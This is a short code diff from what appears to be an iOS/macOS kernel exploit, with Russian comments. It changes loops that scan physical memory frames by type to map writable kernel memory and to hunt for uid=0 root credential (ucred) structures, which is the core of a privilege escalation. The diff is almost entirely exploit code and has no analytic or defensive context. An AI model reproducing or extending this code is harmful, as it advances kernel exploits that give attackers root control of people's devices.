@@ -8142,13 +8142,14 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 //  (C) охота за ROOT cred — uid=0 ucred среди 98 кадров типа 0x18.
                 {
                     kpNote(r, @"  [WRIMAP] старт: карта пишущегося ядра");
+                    uint64_t wB = kconstant(physBase), wN = kconstant(physSize) >> 14;
                     // --- A: тип-матрица ---
                     int wTypes[7] = { 0x0b, 0x0e, 0x21, 0x13, 0x11, 0x17, 0x37 };
                     for (int wi = 0; wi < 7; wi++) {
                         int t = wTypes[wi];
                         uint64_t tp = 0;
-                        for (uint64_t i = (0x40000000ULL >> 14); i < nF; i++) {
-                            uint64_t pa = pB + (i << 14);
+                        for (uint64_t i = (0x40000000ULL >> 14); i < wN; i++) {
+                            uint64_t pa = wB + (i << 14);
                             if (kpFrameTypeOf(pa) == t) { tp = pa; break; }
                         }
                         if (!tp) { kpNote(r, [NSString stringWithFormat:@"  [WRIMAP] тип 0x%x: кадров ≥256MB не найдено", t]); continue; }
@@ -8183,8 +8184,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     }
                     // --- C: ROOT cred — uid=0 ucred в типе 0x18 ---
                     uint32_t rootCands = 0;
-                    for (uint64_t i = 0; i < nF && rootCands < 8; i++) {
-                        uint64_t pa = pB + (i << 14);
+                    for (uint64_t i = 0; i < wN && rootCands < 8; i++) {
+                        uint64_t pa = wB + (i << 14);
                         if (kpFrameTypeOf(pa) != 0x18) continue;
                         uint64_t al = phystokv(pa);
                         if (!al) continue;
